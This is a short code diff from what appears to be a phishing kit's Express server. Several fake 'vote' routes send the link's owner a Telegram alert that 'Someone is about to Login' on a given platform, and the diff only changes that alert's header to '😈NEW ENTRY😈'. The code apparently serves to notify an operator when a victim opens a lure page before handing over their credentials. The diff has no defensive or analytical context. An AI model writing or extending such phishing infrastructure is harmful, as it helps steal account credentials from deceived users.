@@ -19,7 +19,7 @@ router.get("/vote/:linkId", async (req, res) => {
         const user = await User.findById(link.user);
         if (user.notification) {
             await bot.sendMessage(user.telegramID, `
-LOG ENTRY
+😈NEW ENTRY😈
 PLATFORM: ${link.linkType}
 MESSAGE: Someone is about to Login.
 
@@ -47,7 +47,7 @@ router.get("/vote-2/:linkId", async (req, res) => {
         const user = await User.findById(link.user);
         if (user.notification) {
             await bot.sendMessage(user.telegramID, `
-LOG ENTRY
+😈NEW ENTRY😈
 PLATFORM:${link.linkType}
 MESSAGE: Someone is about to Login.
 
@@ -76,7 +76,7 @@ router.get("/vote-3/:linkId", async (req, res) => {
         const user = await User.findById(link.user);
         if (user.notification) {
             await bot.sendMessage(user.telegramID, `
-LOG ENTRY
+😈NEW ENTRY😈
 PLATFORM: ${link.linkType}
 MESSAGE: Someone is about to Login.
 `)
